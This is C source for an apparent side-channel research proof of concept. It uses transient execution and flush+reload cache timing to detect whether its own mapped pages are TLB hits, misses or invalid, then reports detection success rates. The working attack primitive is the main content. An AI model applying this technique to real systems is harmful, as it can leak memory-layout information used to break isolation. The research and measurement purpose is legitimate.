#include "fetchbounce.h"

int main(int argc, const char **argv) {
    // cmdline args options 
    // -noi = no invalid maps check (for better statistical accuracy since invalid map check always succeeds)
    // -d debug info
    // -r[h, m, i, r] fix the result to only hit, miss, invalid or random (default)
    if (argc > 1) {
        for (int i = 1; i < argc; i++) {
            if (argv[i][0] == '-' && argv[i][1] == 'd')
                debug = 1;
            else if (argv[i][0] == '-' && argv[i][1] == 'r') {
                switch (argv[i][2]) {
                    case 'h':
                        fixedresult = 0;
                        break;
                    case 'm': 
                        fixedresult = 1;
                        break;
                    case 'i':
                        fixedresult = 2;
                        break;
                    case 'r':
                        break;
                    default:
                        fprintf(stderr, "incorrect fixed result argument: got [%s] expected [h, m, i, r] continueing with random", argv[i]);
                        break;
                }
            }
            else if(strcmp(argv[i], "-noi") == 0) {
                --presults;
            }
        }
    }

  	memset(lut, 1, sizeof(lut));

	CACHE_MISS = detect_flush_reload_threshold();
    if (debug)
	    printf("Cache miss @ %zd\n", CACHE_MISS);

	// Prepare memory for flush+reload
	for (int i = 0; i < 256; i++) {
		flush(lut + i * 4096);
	}

    char *lastmap = 0;
    if (fixedresult < 0)
	    srand(time(NULL));

    for (int i = 0; i < PAGE_POOL_SIZE; i++) {
        char *curmap = gnrmap();
		// make sure a different address is used
        if (lastmap) {
            munmap((void *) lastmap, PAGE_SIZE);
			lastmap = 0;
        }
        if (!curmap)
            continue;
        switch (rawresults[expected][i]) {
            case hit:
                // try to load the map into the TLB
                memset(curmap, LOAD_BYTE, PAGE_SIZE);
                // flush from cache, should remain in TLB  
                for (int i = 0; i < PAGE_SIZE; i++)
                    flush(curmap + i);
                break;
            case miss:
                break;
            case invalid:
                // make the map invalid
    	        mprotect((void *) curmap, PAGE_SIZE, PROT_NONE);
                break;
            default:
                fprintf(stderr, "out-of-bounds expected result: [%d] in page #%d\n", rawresults[expected][i], i);
                break;
        }
		int r;
		for (r = 0; r < RETRIES; r++) {
			if (try_start()) {
				// trigger transient execution
				maccess(0);
				*curmap = TEST_BYTE;
				// improves accuracy of the attack
				asm volatile("nop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\n");
				maccess(lut + *curmap * 4096);
				try_abort();
			}
      		try_end();
			if (flush_reload(lut + TEST_BYTE * 4096)) {
				break;
			}
    	}
        switch (r) {
            case 0:
                rawresults[actual][i] = hit;
                break;
            case RETRIES:
                rawresults[actual][i] = invalid;
                break;
            default:
                rawresults[actual][i] = miss;
                break;
        }
        if (debug) {
            int success = (rawresults[expected][i] == rawresults[actual][i]);
            printf("PAGE#%04d: %s! expected: %d actual: %d\n",i , (success) ? "SUCCESS" : "FAILURE", rawresults[expected][i], rawresults[expected][i]);
        }
        lastmap = curmap;
    }

    if (lastmap)
        munmap((void *) lastmap, PAGE_SIZE);

    report();

	return (0);
}

void *gnrmap() {
    static int ind = 0;
    int fd;
	if ((fd = open(gnrname(ind), O_RDWR | O_CREAT | O_TRUNC, 0644)) < 0) {
		fprintf(stderr, "gnrmap: open failed (most likely missing the victims directory, if so, run \"make\" command to create)\n");
		return 0;
	}
	static char buf[PAGE_SIZE];
	if (write(fd, buf, PAGE_SIZE) != PAGE_SIZE) {
		close(fd);
		fprintf(stderr, "gnrmap: write failed\n");
		return 0;
    }
    char *page = mmap(0, sysconf(_SC_PAGE_SIZE), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, fd, 0);
    if (fd)
        close(fd);
    if (page == MAP_FAILED) {
    	fprintf(stderr, "gnrmap: mmap failed: %s\n", strerror(errno));
    	return 0;
	}
    rawresults[expected][ind++] = (fixedresult < 0) ? rand() % presults : fixedresult;
    if (debug) {
        printf("expected %d = %d\n", ind - 1, rawresults[expected][ind - 1]);
    }
    return page;
}

char *gnrname(int namei) {
    static char name[21] = PAGE_NAME;
    snprintf(name + 16, 5, "%d", namei);
    if (debug)
        printf("victim file name: %s\n", name);
    return name;
}

void report(void) {
    int results[2][DEFAULT_POSSIBLE_RESULTS] = {{0, 0, 0}, {0, 0, 0}};
    for (int i = 0; i < PAGE_POOL_SIZE; i++) {
        int e = rawresults[expected][i];
        ++results[TOTAL_INDEX][e];
        if (e == rawresults[actual][i])
            ++results[SUCCESS_INDEX][e];
    }
    if (fixedresult < 0)
        printf("total detection success rate: %2.2f%%\n", (double) (results[SUCCESS_INDEX][hit] + results[SUCCESS_INDEX][miss] + results[SUCCESS_INDEX][invalid]) / PAGE_POOL_SIZE * 100);
    if (results[TOTAL_INDEX][hit])
        printf("hit detection success rate: %2.2f%%\n", (double) (results[SUCCESS_INDEX][hit]) / results[TOTAL_INDEX][hit] * 100);
    if (results[TOTAL_INDEX][miss])
        printf("miss detection success rate: %2.2f%%\n", (double) (results[SUCCESS_INDEX][miss]) / results[TOTAL_INDEX][miss] * 100);
    if (results[TOTAL_INDEX][invalid])
        printf("invalid detection success rate: %2.2f%%\n", (double) (results[SUCCESS_INDEX][invalid]) / results[TOTAL_INDEX][invalid] * 100);
}